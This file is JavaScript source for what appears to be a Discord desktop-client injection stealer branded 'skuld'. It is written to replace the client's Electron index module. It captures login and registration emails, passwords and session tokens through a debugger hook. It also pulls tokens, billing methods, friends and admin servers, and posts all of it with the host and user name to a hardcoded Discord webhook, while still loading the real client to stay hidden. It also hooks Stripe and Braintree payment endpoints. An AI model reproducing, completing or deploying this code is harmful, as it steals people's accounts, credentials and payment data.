const fs = require('fs');
const os = require('os');
const https = require('https');
const path = require('path');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const CONFIG = {
    webhook: "https://discord.com/api/webhooks/1501483874222608507/FDcwuzLFcZn57oopdAPCS317qooDz6rtPqMvU4fYgJvRmN7VOgbAg_sgQCivTPisp-1X",
    API: "https://discord.com/api/v9/users/@me",
    filters: {
        uris: [
            '/auth/login',
            '/auth/register',
            '/mfa/totp',
            '/mfa/codes-verification',
            '/users/@me',
        ],
    },
    payment_filters: {
        uris: [
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
            'https://api.stripe.com/v*/tokens',
        ],
    },
    badges: {
        "Discord Employee": { Value: 1, Emoji: "<:8485discordemployee:1163172252989259898>", Rare: true },
        "Partnered Server Owner": { Value: 2, Emoji: "<:9928discordpartnerbadge:1163172304155586570>", Rare: true },
        "HypeSquad Events": { Value: 4, Emoji: "<:9171hypesquadevents:1163172248140660839>", Rare: true },
        "Bug Hunter Level 1": { Value: 8, Emoji: "<:4744bughunterbadgediscord:1163172239970140383>", Rare: true },
        "Early Supporter": { Value: 512, Emoji: "<:5053earlysupporter:1163172241996005416>", Rare: true },
        "Bug Hunter Level 2": { Value: 16384, Emoji: "<:1757bugbusterbadgediscord:1163172238942543892>", Rare: true },
        "Early Verified Bot Developer": { Value: 131072, Emoji: "<:1207iconearlybotdeveloper:1163172236807639143>", Rare: true },
        "House Bravery": { Value: 64, Emoji: "<:6601hypesquadbravery:1163172246492287017>", Rare: false },
        "House Brilliance": { Value: 128, Emoji: "<:6936hypesquadbrilliance:1163172244474822746>", Rare: false },
        "House Balance": { Value: 256, Emoji: "<:5242hypesquadbalance:1163172243417858128>", Rare: false },
        "Active Developer": { Value: 4194304, Emoji: "<:1207iconactivedeveloper:1163172534443851868>", Rare: false },
        "Certified Moderator": { Value: 262144, Emoji: "<:4149blurplecertifiedmoderator:1163172255489065481>", Rare: true },
        "Spammer": { Value: 1048704, Emoji: "☑", Rare: false },
    }
};

// ===================== REQUEST FUNCTION =====================
const request = (method, url, headers = {}, data = null) => {
    return new Promise((resolve, reject) => {
        try {
            const parsedUrl = new URL(url);
            const options = {
                protocol: parsedUrl.protocol,
                hostname: parsedUrl.hostname,
                port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
                path: parsedUrl.pathname + parsedUrl.search,
                method: method,
                headers: {
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0",
                    ...headers
                }
            };

            if (data) {
                options.headers['Content-Length'] = Buffer.byteLength(data);
            }

            const req = https.request(options, (res) => {
                let responseData = '';
                res.on('data', chunk => responseData += chunk);
                res.on('end', () => {
                    console.log(`[Webhook] Status: ${res.statusCode}`);
                    resolve(responseData);
                });
            });

            req.on('error', (err) => {
                console.error('[Webhook Error]', err.message);
                reject(err);
            });

            if (data) req.write(data);
            req.end();
        } catch (e) {
            reject(e);
        }
    });
};

const executeJS = (script) => {
    try {
        const window = BrowserWindow.getAllWindows()[0];
        if (window) return window.webContents.executeJavaScript(script, true);
    } catch (e) {}
    return null;
};

const getToken = async () => {
    try {
        return await executeJS(`(webpackChunkdiscord_app.push([['']],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
    } catch (e) {
        return null;
    }
};

// ===================== HELPERS =====================
const fetch = async (endpoint, headers) => {
    try {
        const data = await request("GET", CONFIG.API + endpoint, headers);
        return JSON.parse(data || '{}');
    } catch { return {}; }
};

const fetchAccount = token => fetch("", { "Authorization": token });
const fetchBilling = token => fetch("/billing/payment-sources", { "Authorization": token });
const fetchServers = token => fetch("/guilds?with_counts=true", { "Authorization": token });
const fetchFriends = token => fetch("/relationships", { "Authorization": token });

const getNitro = flags => {
    switch (flags) {
        case 1: return 'Nitro Classic';
        case 2: return 'Nitro Boost';
        case 3: return 'Nitro Basic';
        default: return '❌';
    }
};

const getBadges = flags => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        const b = CONFIG.badges[badge];
        if ((flags & b.Value) === b.Value) badges += b.Emoji + ' ';
    }
    return badges || '❌';
};

const getRareBadges = flags => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        const b = CONFIG.badges[badge];
        if ((flags & b.Value) === b.Value && b.Rare) badges += b.Emoji + ' ';
    }
    return badges;
};

const getBilling = async token => {
    try {
        const data = await fetchBilling(token);
        let billing = '';
        data.forEach(x => {
            if (x && !x.invalid) {
                if (x.type === 1) billing += '<:paypal:1148653305376034967> ';
                else if (x.type === 2) billing += '💳 ';
            }
        });
        return billing || '❌';
    } catch { return '❌'; }
};

const getFriends = async token => {
    try {
        const friends = await fetchFriends(token);
        const filtered = friends.filter ? friends.filter(u => u.type === 1) : [];
        let rare = "";
        for (const acc of filtered) {
            const b = getRareBadges(acc.user?.public_flags || 0);
            if (b) {
                if (!rare) rare = "**Rare Friends:**\n";
                rare += `${b} ${acc.user?.username || 'Unknown'}\n`;
            }
        }
        return { message: rare || "**No Rare Friends**", totalFriends: filtered.length };
    } catch {
        return { message: "**No Rare Friends**", totalFriends: 0 };
    }
};

const getServers = async token => {
    try {
        const guilds = await fetchServers(token);
        const filtered = guilds.filter ? guilds.filter(g => 
            g.permissions === '562949953421311' || g.permissions === '2251799813685247'
        ) : [];
        let rare = "";
        for (const g of filtered) {
            if (!rare) rare = "**Rare Servers:**\n";
            rare += `${g.owner ? "👑 Owner" : "🛡️ Admin"} | ${g.name} - ${g.approximate_member_count} members\n`;
        }
        return { message: rare || "**No Rare Servers**", totalGuilds: guilds.length || 0 };
    } catch {
        return { message: "**No Rare Servers**", totalGuilds: 0 };
    }
};

// ===================== HOOKER =====================
const hooker = async (content, token, account) => {
    try {
        content.content = `\`${os.hostname()}\` - \`${os.userInfo().username}\`\n${content.content || ''}`;
        content.username = "skuld - cord injection";
        content.avatar_url = "https://i.ibb.co/GJGxZzGX/discord-avatar-512-FCWUJ.png";
        
        content.embeds = content.embeds || [{}];
        const embed = content.embeds[0];
        embed.author = { name: account?.username || "Unknown" };
        embed.thumbnail = { url: account?.avatar ? `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp` : "" };
        embed.footer = { text: "skuld discord injection", icon_url: "https://avatars.githubusercontent.com/u/145487845?v=4" };
        embed.title = "Account Information";
        embed.color = 0xb143e3;

        embed.fields = embed.fields || [];
        embed.fields.push(
            { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false },
            { name: "Nitro", value: getNitro(account?.premium_type), inline: true },
            { name: "Badges", value: getBadges(account?.flags || 0), inline: true },
            { name: "Billing", value: await getBilling(token), inline: true }
        );

        content.embeds.push(
            { title: `Total Friends: ${(await getFriends(token)).totalFriends}`, description: (await getFriends(token)).message },
            { title: `Total Servers: ${(await getServers(token)).totalGuilds}`, description: (await getServers(token)).message }
        );

        await request("POST", CONFIG.webhook, {}, JSON.stringify(content));
        console.log("[+] Webhook sent successfully");
    } catch (err) {
        console.error("[-] Webhook failed:", err.message);
    }
};

// ===================== EVENT HANDLERS =====================
const EmailPassToken = async (email, password, token, action) => {
    try {
        const account = await fetchAccount(token);
        const content = {
            content: `**${account.username}** just **${action}**!`,
            embeds: [{ fields: [
                { name: "Email", value: `\`${email}\``, inline: true },
                { name: "Password", value: `\`${password}\``, inline: true }
            ]}]
        };
        hooker(content, token, account);
    } catch (e) {}
};

// Add other handlers (BackupCodesViewed, PasswordChanged, etc.) similarly if needed

// ===================== DELAYED INIT (Prevents Crash) =====================
setTimeout(() => {
    try {
        const mainWindow = BrowserWindow.getAllWindows()[0];
        if (!mainWindow) return;

        mainWindow.webContents.debugger.attach('1.3');
        mainWindow.webContents.debugger.on('message', async (_, method, params) => {
            if (method !== 'Network.responseReceived') return;
            if (!CONFIG.filters.uris.some(u => params.response.url.includes(u))) return;
            if (![200, 202].includes(params.response.status)) return;

            try {
                const responseBody = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId });
                const requestBody = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId });

                const responseData = JSON.parse(responseBody.body || '{}');
                const requestData = JSON.parse(requestBody.postData || '{}');

                if (params.response.url.endsWith('/login')) {
                    if (responseData.token) EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
                } else if (params.response.url.endsWith('/register')) {
                    EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
                } // Add more handlers as needed
            } catch (e) {}
        });

        mainWindow.webContents.debugger.sendCommand('Network.enable');
    } catch (e) {
        console.error('[-] Debugger init failed:', e.message);
    }
}, 3500);

// Payment handlers
setTimeout(() => {
    try {
        if (session?.defaultSession) {
            session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details) => {
                // payment handler code...
            });
        }
    } catch (e) {}
}, 4000);

// BetterDiscord
const bdPath = path.join(process.env.APPDATA, 'BetterDiscord', 'data', 'betterdiscord.asar');
if (fs.existsSync(bdPath)) require(bdPath);

module.exports = require("./core.asar");
